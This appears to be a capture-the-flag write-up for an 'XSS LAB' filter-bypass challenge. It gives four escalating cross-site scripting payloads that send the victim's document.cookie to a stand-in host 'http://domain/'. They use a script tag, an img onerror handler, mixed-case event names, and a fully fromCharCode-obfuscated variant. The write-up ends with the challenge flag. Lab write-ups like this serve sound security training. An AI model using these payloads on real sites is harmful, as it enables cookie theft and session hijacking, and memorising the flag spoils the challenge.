## XSS LAB

### Description

We got an access to a training resource from WebTopia, where they practise XSS filter bypassing. Enjoy it!

_Note_ : If your payload does not seem to work at first, please use [RequestBin](https://public.requestbin.com/) to check before contacting the support.

**Author: algorab**

### Solution

Let's suppose we want to exfiltrate the cookies to the url `http://domain/`.

#### Step 1

Payload: 
```html
<script>document.location.replace("http://domain/?c="+document.cookie)</script>
```

#### Step 2

Payload:
```html
<img src=x onerror='document.location.replace("http://domain/?c="+document.cookie)'>
```

#### Step 3

Payload:
```html
<img src=x oNerror='document.location.replace("//domain/?c="+document.cookie)'>
```

#### Step 4

Payload:
```html
<img src=x oNerror="location.replace(''.__proto__.constructor.fromCharCode(104, 116, 116, 112, 58, 47, 47, 100, 111, 109, 97, 105, 110, 47, 63, 99, 61).concat(window[``.__proto__.constructor.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116)][location.host.__proto__.constructor.fromCharCode(99, 111, 111, 107, 105, 101)]))">
```

### Flag

`N0PS{n0w_Y0u_4r3_x55_Pr0}`